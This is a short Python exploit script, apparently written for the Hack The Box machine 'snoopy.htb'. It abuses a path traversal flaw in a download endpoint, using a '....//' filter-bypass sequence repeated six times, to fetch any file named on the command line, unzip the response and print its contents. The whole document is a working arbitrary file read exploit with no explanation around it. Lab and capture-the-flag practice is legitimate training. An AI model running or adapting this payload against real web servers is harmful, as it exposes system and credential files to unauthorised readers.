#!/usr/bin/env python3
import sys, requests, zipfile, io

BASE = "http://snoopy.htb/download?file=" + "....//" * 6

def main():
    if len(sys.argv) != 2:
        sys.exit("Usage: ./script.py <filename>")
    r = requests.get(BASE + sys.argv[1])
    r.raise_for_status()
    with zipfile.ZipFile(io.BytesIO(r.content)) as z:
        for name in [f"press_package{sys.argv[1]}", sys.argv[1]] + z.namelist():
            try:
                print(z.read(name).decode())
                return
            except KeyError:
                continue
        print("No readable file found")

if __name__ == "__main__":
    main()
